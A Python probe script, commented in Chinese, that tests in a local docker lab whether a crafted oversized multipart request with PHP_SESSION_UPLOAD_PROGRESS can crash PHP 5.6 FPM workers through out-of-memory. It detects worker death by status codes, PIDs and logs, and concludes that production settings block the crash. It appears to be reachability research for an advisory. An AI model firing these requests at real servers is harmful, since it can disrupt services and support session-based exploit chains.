#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe6_prod.py — 生产参数（post_max_size < memory_limit）窗口1 可达性验证

针对「php5.6.40 + nginx + php-fpm」生产架构，唯一入口是 nginx(8091)。
只走 nginx，绝不直连 9000（生产 FPM 端口从不对外暴露，直连测出的"可达性"
在生产里没有对应路径）。

实验对象是 docker56 靶场（生产参数）：
  memory_limit = 128M   >   post_max_size = 8M
  pm.max_children = 5, pm.max_requests = 500（多 worker + 回收）

源码依据（php56-fpm 容器 /usr/src/php，2026-10-26 核对）：
  main/rfc1867.c:715
      if (SG(post_max_size) > 0 &&
          SG(request_info).content_length > SG(post_max_size)) {
          sapi_error(E_WARNING, "... exceeds the limit ...");
          return;                     // ← 在 FILE_START 之前就返回
      }
  也就是说：当 Content-Length > post_max_size 时，multipart 解析（以及
  rfc1867 的 FILE_START 回调、php_rinit_session 的 pre-RINIT 发布）根本不
  会开始。生产里 memory_limit(128M) >> post_max_size(8M)，无论怎么发：
    - Content-Length > 8M  → 入口即 return，无 OOM；
    - Content-Length ≤ 8M  → 最多 8M 数据，内存累积远够不到 128M。
  结论：窗口1（解析期 OOM → worker 死亡）在生产参数下不可达。

判据（display_errors=Off 下 fatal 文本不可见，只能降级）：
  主判据 = A 请求自身的状态码：
      200        → worker 存活（post_max_size 前置闸门拦截），窗口1 闭合；
      502/504    → worker 死亡（OOM→exit(70)→nginx 拿不到响应），窗口1 可达。
  这个判据不依赖 PID，真实线上（无 index.php 回显 pid）同样可用。
  pid 变化  —— 仅单 worker（pm.max_children=1）时可靠；多 worker 下基线
     GET 与攻击 A 可能落在不同 worker，会漏报，故只作辅助信号。
  FPM 日志（docker logs）—— 仅靶场观测辅助，生产拿不到，不构成攻击路径。

用法：
  python tools56/probe6_prod.py [--url http://127.0.0.1:8091/index.php]
                                [--big-mb 12] [--rounds 3] [--no-pid]

退出码：
  0 = 窗口1 可达（攻击后观测到 worker 死亡/5xx）—— 生产参数下不应出现；
  1 = 窗口1 闭合（worker 存活，post_max_size 前置闸门生效）—— 预期结果；
  2 = 无 PID 模式下无法确定（状态码模棱两可）。
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = "http://127.0.0.1:8091/index.php"
SID = b"attacksessionid0001"
FPM_CONTAINER = "php56-fpm"      # 仅用于 docker logs 观测，非攻击路径
A_DEATH = ("exited with code 70",)


def a_parts(big_mb: int) -> list:
    """与公告窗口1 的 A 请求同构：文件字段触发 FILE_START，再 big 字段 OOM。

    字段顺序关键：file 在前，big 在后。生产参数下 post_max_size 会在
    入口处拦截（因为 big 字段把 Content-Length 顶过 8M），FILE_START 不会
    触发；翻转参数后（post_max_size > memory_limit）此请求才会真正 OOM。
    """
    big = b"B" * (big_mb * 1024 * 1024)
    return [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": big},
    ]


def get_pid(url: str, timeout: float = 15.0) -> str | None:
    """通过 index.php 回显的 pid= 提取 worker PID。失败返回 None。"""
    t = Target(url, timeout=timeout, verbose=False)
    try:
        code, body = t.get("/index.php", read_cap=4096)
    except OSError:
        return None
    if code != 200:
        return None
    for token in body.split():
        if token.startswith(b"pid="):
            return token[4:].decode("ascii", "replace")
    return None


def fpm_death_lines(since_ts: float) -> list[str]:
    """读取 FPM 日志里 since_ts 之后的 exit(70) 行（靶场观测辅助）。"""
    try:
        out = subprocess.run(
            ["docker", "logs", "--since",
             f"{int(time.time() - since_ts) + 1}s", FPM_CONTAINER],
            capture_output=True, text=True, timeout=10,
        )
        blob = out.stdout + out.stderr
    except Exception:
        return []
    return [ln for ln in blob.splitlines() if any(p in ln for p in A_DEATH)]


def one_round(url: str, big_mb: int, use_pid: bool) -> dict:
    info: dict = {}
    t = Target(url, timeout=90.0, verbose=False)

    # 基线：攻击前的 worker 身份
    pid0 = get_pid(url) if use_pid else None
    info["pid0"] = pid0
    t0 = time.time()

    # 攻击：12M multipart（Content-Length > post_max_size=8M）
    try:
        resp_a = t.post(build_multipart(a_parts(big_mb), b"S" * 17), b"S" * 17,
                        read_cap=1 << 20, timeout=90.0)
    except OSError as e:
        resp_a = b""
        info["a_conn_err"] = str(e)
    head, _, body = resp_a.partition(b"\r\n\r\n")
    import re
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    info["a_code"] = int(m.group(1)) if m else 0
    info["a_body_len"] = len(body)
    time.sleep(1.5)  # 若 worker 死，等 master 重拉新 child

    # 攻击后的 worker 身份
    pid1 = get_pid(url) if use_pid else None
    info["pid1"] = pid1

    # 存活探测（无 PID 模式的辅助判据）
    code_c, _ = t.get("/index.php", read_cap=4096)
    info["c_code"] = code_c

    death = fpm_death_lines(t0)
    info["death_lines"] = death[:2]

    # 判定 worker 是否死亡：以 A 请求状态码为主判据（不依赖 PID）
    killed = (info["a_code"] in (502, 504)
              or code_c in (502, 504)
              or bool(death))
    # pid 变化仅在单 worker 下可靠，这里只作辅助信号
    if use_pid and pid0 is not None and pid1 is not None and pid0 != pid1:
        killed = True
    info["killed"] = killed
    return info


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=URL)
    ap.add_argument("--big-mb", type=int, default=12)
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--no-pid", action="store_true",
                    help="无 PID 模式：真实线上拿不到 pid，只靠状态码判定")
    args = ap.parse_args()

    use_pid = not args.no_pid
    print("=" * 64)
    print("[*] probe6: 生产参数窗口1 可达性（只经 nginx，不触 FPM 9000）")
    print(f"    url={args.url}  big={args.big_mb}MB  pid_mode={use_pid}")
    print("    前提: memory_limit=128M > post_max_size=8M")
    print("=" * 64)

    killed_count = 0
    for i in range(args.rounds):
        print(f"\n--- round {i} ---")
        info = one_round(args.url, args.big_mb, use_pid)
        print(f"  [A] code={info.get('a_code')} body_len={info.get('a_body_len')}")
        if use_pid:
            print(f"  [PID] {info.get('pid0')} -> {info.get('pid1')}")
        print(f"  [C] liveness_code={info.get('c_code')}")
        for ln in info.get("death_lines", [])[:2]:
            print(f"      fpm_log: {ln[:120]}")
        if info["killed"]:
            killed_count += 1
            print("  [!] worker killed —— 窗口1 可达")
        else:
            print("  [=] worker 存活 —— post_max_size 前置闸门生效，窗口1 闭合")

    print(f"\n[=] killed={killed_count}/{args.rounds}")
    if killed_count:
        print("[+] WINDOW-1 REACHABLE: 生产参数下不应出现，检查 post_max_size 是否被改大")
        return 0
    print("[=] WINDOW-1 CLOSED: 生产参数(memory>post_max)下解析期 OOM 不可达，"
          "与 rfc1867.c:715 的前置检查一致。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
